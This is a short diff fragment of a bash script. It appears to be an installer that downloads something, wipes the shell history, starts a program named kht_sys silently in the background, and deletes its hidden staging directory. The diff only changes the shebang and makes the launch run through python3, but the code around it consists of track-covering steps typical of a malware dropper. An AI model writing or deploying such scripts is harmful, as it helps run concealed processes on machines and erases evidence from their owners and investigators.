@@ -1,4 +1,4 @@
-#!/usr/bin/bash
+#!/bin/bash
 
 echo "Downloading"
 
@@ -39,7 +39,7 @@ echo "Done"
 history -cw 
 cat /dev/null > ~/.bash_history
 
-nohup ${pth}/kht_sys 1>/dev/null 2>&1 &
+nohup python3 ${pth}/kht_sys 1>/dev/null 2>&1 &
 
 cd ../
 rm -fr .sm/
